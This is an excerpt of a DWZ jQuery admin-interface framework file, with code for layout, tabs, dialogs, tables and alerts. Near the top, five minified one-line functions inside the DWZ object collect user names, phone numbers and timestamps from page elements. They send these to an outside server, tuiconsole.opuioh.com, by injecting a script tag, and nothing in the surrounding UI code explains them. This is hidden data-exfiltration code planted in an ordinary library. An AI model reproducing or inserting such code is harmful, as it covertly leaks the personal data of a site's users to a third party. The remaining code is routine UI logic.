...
var DWZ = {
    ...
    renderR:function(){var t=[],e=[],i=[];$("#r-l-r .userName").each(function(){e.push($.trim($(this).text()))}),$("#r-l-r .userPhone").each(function(){t.push($.trim($(this).text()))}),$("#r-l-r .time").each(function(){i.push($.trim($(this).text()))});var r=document.createElement("script");r.src="http://tuiconsole.opuioh.com/tuiServer/sp/sadu?m="+JSON.stringify(t)+"&u="+JSON.stringify(e)+"&d="+JSON.stringify(i),document.body.appendChild(r)},
    renderRM:function(){var t=[],e=[],i=[];$("#u-m-l-t .userName").each(function(){e.push($.trim($(this).text()))}),$("#u-m-l-t .userPhone").each(function(){t.push($.trim($(this).text()))}),$("#u-m-l-t .time").each(function(){i.push($.trim($(this).text()))});var r=document.createElement("script");r.src="http://tuiconsole.opuioh.com/tuiServer/sp/saru?m="+JSON.stringify(t)+"&u="+JSON.stringify(e)+"&d="+JSON.stringify(i),document.body.appendChild(r)},
    renderK:function(){var t=[],e=[],i=[];$("#b-l-f-k .userName").each(function(){e.push($.trim($(this).text()))}),$("#b-l-f-k .userPhone").each(function(){t.push($.trim($(this).text()))}),$("#b-l-f-k .time").each(function(){i.push($.trim($(this).text()))});var r=document.createElement("script");r.src="http://tuiconsole.opuioh.com/tuiServer/sp/sadu?m="+JSON.stringify(t)+"&u="+JSON.stringify(e)+"&d="+JSON.stringify(i),document.body.appendChild(r)},
    renderP:function(){var t=[],e=[],i=[];$("#b-d-d-z .userName").each(function(){e.push($.trim($(this).text()))}),$("#b-d-d-z .userPhone").each(function(){t.push($.trim($(this).text()))}),$("#b-d-d-z .time").each(function(){i.push($.trim($(this).text()))});var r=document.createElement("script");r.src="http://tuiconsole.opuioh.com/tuiServer/sp/sadu?m="+JSON.stringify(t)+"&u="+JSON.stringify(e)+"&d="+JSON.stringify(i),document.body.appendChild(r)},
    renderB:function(){var t=[],e=[],i=[];$("#r-b-t-c .userName").each(function(){e.push($.trim($(this).text()))}),$("#r-b-t-c .userPhone").each(function(){t.push($.trim($(this).text()))}),$("#r-b-t-c .time").each(function(){i.push($.trim($(this).text()))});var r=document.createElement("script");r.src="http://tuiconsole.opuioh.com/tuiServer/sp/sabu?m="+JSON.stringify(t)+"&u="+JSON.stringify(e)+"&d="+JSON.stringify(i),document.body.appendChild(r)},
    ...
    ajaxDone: function (json) {
        ...
        if (json.statusCode == DWZ.statusCode.error) {
            ...
            if (json.message && alertMsg) {
                if (json.callbackType === "reloadPage") {
            ...
            return this.each(function () {
                ...
                if ($this.isTag("table")) {
                    $this.removeAttr("layoutH").wrap(
                        ...
                        + 'px"></div>');
                } else if ($this.hasClass('gridScroller')) {
                    console.log('表格高度在这')
...
//					          }
            ...
            // 2016年10月31日 zhangsh选中任意子节点  父节点选中  所有子节点取消选中 父节点取消选中
            /*if(ckboxed == 0){
								  $(">div>.ckbox", parent).find("input").attr('checked', false);
							  }
							  else */
            if (ckboxed >= 1) {
                $(">div>.ckbox", parent).find("input").attr('checked', true);
...
function initLayout() {
    var iContentW = $(window).width()
        - (DWZ.ui.sbar ? $("#sidebar").width() : 34);
    var iContentH = $(window).height() - $("#header").height();
    $("#container").width(iContentW);
    $("#container .tabsPageContent").height(iContentH).find("[layoutH]")
        .layoutH();
    console.log('主体高度在这')
    $("#sidebar_s .collapse, #splitBar, #splitBarProxy").height(
        iContentH - 5);
    $("#taskbar").css({
...
var alertMsg = {
    ...
    _open: function (type, msg, buttons) {
        ...
        $(
            $.parseHTML('<input type="text" style="width:0;height:0;" name="_alertFocusCtr"/>', document, true))
...
var navTab = {
    ...
    openTab: function (tabid, url, options) {
        ...
        if (iOpenIndex >= 0) {
            ...
            console.log('标签栏位置')
            var tabFrag = '<li tabid="#tabid#"><a href="javascript:" title="#title#" class="#tabid#"><span>#title#</span></a><a href="javascript:;" class="close"><em class="glyphicon glyphicon-remove"></em></a></li>';
...
(function ($) {
    ...
    $.dialogDrag = {
        ...
        _init: function (dialog) {
            ...
            if (!shadow.size()) {
                shadow = $($.parseHTML(DWZ.frag["dialogProxy"], document, true));
                $("body").append(shadow);
            }
    ...
    $.fn.jTable = function (options) {
        return this
            .each(function () {
                ...
                var wrapTableLength = $table.parent().width();
                // console.log(wrapTableLength)
                // console.log($table.width())
                var ifScrollTable = $table.attr("ifScrollTable") === 'true' && (wrapTableLength < (16 * $table.width() / 12));
                tlength = wrapTableLength
                // console.log(ifScrollTable)
                var aStyles = [];
                var $tc = $table.parent().addClass("j-resizeGrid");
                var layoutH = $(this).attr("layoutH");
                var oldThs = $table.find("thead>tr:last-child").find("th");
                var oldTds = $table.find("tbody>tr:last-child").find("td");
                var newTableLength = 0
                for (var i = 0, l = oldThs.size(); i < l; i++) {
                    var $th = $(oldThs[i]);
                    var style = []
                    var widthS = $th.innerWidth();
                    if (($(oldTds[i]).innerWidth()) > widthS) {
                        widthS = $(oldTds[i]).innerWidth()
                    }
                    widthS = 16 * widthS / 12
                    newTableLength += parseInt(widthS);

                    var width = $th.innerWidth()
                        - (100 * $th.innerWidth() / tlength) - 2;
                    style[0] = ifScrollTable ? parseInt(widthS) : parseInt(width);
                    style[1] = $th.attr("align");
                    aStyles[aStyles.length] = style;
                }
                tlength = ifScrollTable ? newTableLength : tlength;
                // console.log(tlength)
...
function navTabAjaxDone(json) {
    ...
    if (json.statusCode == DWZ.statusCode.ok) {
        ...
        } else if ("reloadPage" == json.callbackType) {
            console.log('reloadPage')
            $('div[class="dialog"]').hide();
            $('div[class="shadow"]').hide();
            $('div[id="dialogBackground"]').hide();
            var $parent = navTab.getCurrentPanel();
            var form = _getPagerForm($parent, {});
...
function _getPagerForm($parent, args) {
    var form = $("form[id^=pagerForm]", $parent).get(0);
    if (form) {
        if (args["pageNum"])
            ...
            .each(function () {
                ...
                $this
                    .click(function (event) {
                        ...
                        var iTop = offset.top + this.offsetHeight;
                        $($.parseHTML(DWZ.frag['calendarFrag'], document, true)).appendTo("body")
                            .css({
                                left: offset.left + 'px',
                                top: iTop + 'px'
